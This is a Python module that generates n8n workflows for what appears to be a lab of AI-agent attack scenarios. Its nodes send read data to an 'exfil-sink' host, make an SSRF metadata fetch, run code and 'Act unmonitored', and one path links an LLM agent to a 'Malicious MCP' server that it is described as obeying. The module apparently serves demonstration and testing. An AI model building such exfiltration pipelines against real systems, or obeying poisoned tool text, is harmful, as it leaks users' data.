"""Generate a real n8n workflow per scenario — the 7 archetypes as code.

The refund flagship keeps its bespoke workflow (rich ticket queue). Every other
scenario is emitted here as a genuine n8n graph that EXECUTES real HTTP tool
calls when triggered:

    Webhook → Plan (agent brain) → IF gate → <archetype tools> → Respond

The archetype determines the tool nodes, so each workflow's graph reads as its
own attack (exfil egress, SSRF fetch, run-code, loop, …). Generating them from
the catalog gives "7 templates → 62 workflows" leverage with no hand-drift: the
workflows can't fall out of sync with the scenarios.

CLI:  python -m app.n8n_workflows <dest_dir>   # writes one <webhook>.json each
"""

import json
import sys
import uuid
from pathlib import Path

from app.scenarios import SCENARIOS

SPAWNER = "http://meeseeks-spawner:8007"
SINK = "http://exfil-sink:8009"
MCP_ENDPOINT = "http://meeseeks-mcp:8011/mcp"
# Placeholder swapped for the real openAiApi credential id at provision time.
BRAIN_CRED_PLACEHOLDER = "BRAIN_CREDENTIAL_ID"
_NS = uuid.UUID("00000000-0000-0000-0000-0000feed0001")

_EGRESS = {"exfil", "disclose"}
# archetype -> (true-branch node name, the dangerous marker it stands for)
_EXECUTE_LABEL = {
    "action": "Execute action",
    "rce": "Run code",
    "resource": "Loop forever",
    "demo": "Act unmonitored",
}


def _nid(webhook: str, slug: str) -> str:
    return str(uuid.uuid5(_NS, f"{webhook}:{slug}"))


def _webhook_node(webhook, pos):
    return {
        "parameters": {"httpMethod": "POST", "path": webhook, "responseMode": "responseNode"},
        "id": _nid(webhook, "webhook"), "name": "Webhook",
        "type": "n8n-nodes-base.webhook", "typeVersion": 2, "position": pos, "webhookId": webhook,
    }


def _http(webhook, name, method, url, pos, json_body=None):
    params = {"method": method, "url": url, "options": {}}
    if json_body is not None:
        params.update({"sendBody": True, "specifyBody": "json", "jsonBody": json_body})
    return {
        "parameters": params, "id": _nid(webhook, name), "name": name,
        "type": "n8n-nodes-base.httpRequest", "typeVersion": 4.2, "position": pos,
    }


def _if_gate(webhook, pos):
    return {
        "parameters": {"conditions": {
            "options": {"caseSensitive": True, "typeValidation": "loose"},
            "combinator": "and",
            "conditions": [{
                "id": "c1", "leftValue": "={{ $json.gate }}", "rightValue": "",
                "operator": {"type": "string", "operation": "notEmpty"},
            }],
        }},
        "id": _nid(webhook, "if"), "name": "Compromised?",
        "type": "n8n-nodes-base.if", "typeVersion": 2, "position": pos,
    }


def _respond(webhook, name, body_expr, pos):
    return {
        "parameters": {"respondWith": "json", "responseBody": body_expr},
        "id": _nid(webhook, name), "name": name,
        "type": "n8n-nodes-base.respondToWebhook", "typeVersion": 1, "position": pos,
    }


def _conn(node, *targets):
    return {node: {"main": [[{"node": t, "type": "main", "index": 0} for t in targets]]}}


def _branch(node, true_node, false_node):
    # IF node: output 0 = true, output 1 = false. Two separate output groups.
    return {node: {"main": [
        [{"node": true_node, "type": "main", "index": 0}],
        [{"node": false_node, "type": "main", "index": 0}],
    ]}}


def _mcp_workflow(scenario: dict, brain_cred_id: str) -> dict:
    """An AI-Agent graph that runs the exploit over a REAL malicious MCP server.

    Webhook → AI Agent (brain model + malicious MCP tool) → Respond. The agent
    loop is real MCP: n8n discovers the rogue server's tools, our keyless brain
    reads the poison and obeys, and the hostile tools exfiltrate for real.
    """
    webhook = scenario["n8n_webhook"]

    def node(slug, name, typ, ver, params, pos, extra=None):
        n = {"parameters": params, "id": _nid(webhook, slug), "name": name,
             "type": typ, "typeVersion": ver, "position": pos}
        if extra:
            n.update(extra)
        return n

    nodes = [
        _webhook_node(webhook, [0, 0]),
        node("agent", "AI Agent", "@n8n/n8n-nodes-langchain.agent", 3.1,
             {"promptType": "define", "text": scenario["mcp_task"], "options": {}}, [260, 0]),
        node("model", "Brain Model", "@n8n/n8n-nodes-langchain.lmChatOpenAi", 1.2,
             {"model": {"__rl": True, "mode": "list", "value": "gpt-4o-mini"}, "options": {}}, [120, 220],
             extra={"credentials": {"openAiApi": {"id": brain_cred_id, "name": "Meeseeks Brain"}}}),
        node("mcp", "Malicious MCP", "@n8n/n8n-nodes-langchain.mcpClientTool", 1.2,
             {"endpointUrl": MCP_ENDPOINT, "serverTransport": "httpStreamable",
              "authentication": "none", "include": "all"}, [360, 220]),
        _respond(webhook, "Respond", "={{ { \"result\": \"mcp\", \"output\": $json.output } }}", [640, 0]),
    ]
    connections = {}
    connections.update(_conn("Webhook", "AI Agent"))
    connections["Brain Model"] = {"ai_languageModel": [[{"node": "AI Agent", "type": "ai_languageModel", "index": 0}]]}
    connections["Malicious MCP"] = {"ai_tool": [[{"node": "AI Agent", "type": "ai_tool", "index": 0}]]}
    connections.update(_conn("AI Agent", "Respond"))
    return {"name": webhook, "nodes": nodes, "connections": connections, "settings": {}}


def workflow_for(scenario: dict, brain_cred_id: str = BRAIN_CRED_PLACEHOLDER) -> dict:
    if scenario.get("mcp_task"):
        return _mcp_workflow(scenario, brain_cred_id)
    sid, webhook, archetype = scenario["id"], scenario["n8n_webhook"], scenario["archetype"]
    win_body = (
        "={{ { \"result\": \"win\", \"mechanic\": $('Plan').item.json.mechanic, "
        "\"target\": $('Plan').item.json.target } }}"
    )
    clean_body = "={{ { \"result\": \"clean\" } }}"

    nodes = [
        _webhook_node(webhook, [0, 0]),
        _http(webhook, "Plan", "POST", f"{SPAWNER}/scenario/{sid}/plan", [220, 0]),
        _if_gate(webhook, [440, 0]),
        _respond(webhook, "Respond clean", clean_body, [660, 160]),
    ]
    connections = {}
    connections.update(_conn("Webhook", "Plan"))
    connections.update(_conn("Plan", "Compromised?"))

    if archetype in _EGRESS:
        nodes += [
            _http(webhook, "Read data", "GET", f"{SPAWNER}/scenario/{sid}/data", [660, -120]),
            _http(webhook, "Exfiltrate", "POST", f"{SINK}/collect", [880, -120],
                  json_body="={{ { \"source\": \"n8n-" + webhook + "\", \"payload\": $json } }}"),
            _respond(webhook, "Respond win", win_body, [1100, -120]),
        ]
        connections.update(_branch("Compromised?", "Read data", "Respond clean"))
        connections.update(_conn("Read data", "Exfiltrate"))
        connections.update(_conn("Exfiltrate", "Respond win"))
    elif archetype == "recon":
        nodes += [
            _http(webhook, "SSRF fetch", "GET", f"{SPAWNER}/internal/metadata", [660, -120]),
            _respond(webhook, "Respond win", win_body, [880, -120]),
        ]
        connections.update(_branch("Compromised?", "SSRF fetch", "Respond clean"))
        connections.update(_conn("SSRF fetch", "Respond win"))
    else:  # action / rce / resource / demo — a real state-changing tool call
        label = _EXECUTE_LABEL.get(archetype, "Execute action")
        nodes += [
            _http(webhook, label, "POST", f"{SPAWNER}/scenario/{sid}/execute", [660, -120]),
            _respond(webhook, "Respond win", win_body, [880, -120]),
        ]
        connections.update(_branch("Compromised?", label, "Respond clean"))
        connections.update(_conn(label, "Respond win"))

    return {"name": webhook, "nodes": nodes, "connections": connections, "settings": {}}


def write_all(dest: Path, brain_cred_id: str = BRAIN_CRED_PLACEHOLDER) -> list[str]:
    dest.mkdir(parents=True, exist_ok=True)
    written = []
    for s in SCENARIOS:
        if s["id"] == "AGENT-01-REFUND-EXFIL":
            continue  # bespoke flagship workflow ships as a static file
        wf = workflow_for(s, brain_cred_id)
        path = dest / f"{s['n8n_webhook']}.json"
        path.write_text(json.dumps(wf, indent=2) + "\n")
        written.append(path.name)
    return written


if __name__ == "__main__":
    # usage: python -m app.n8n_workflows <dest_dir> [brain_credential_id]
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("workflows")
    cred = sys.argv[2] if len(sys.argv) > 2 else BRAIN_CRED_PLACEHOLDER
    names = write_all(out, cred)
    print(f"wrote {len(names)} workflows to {out}")
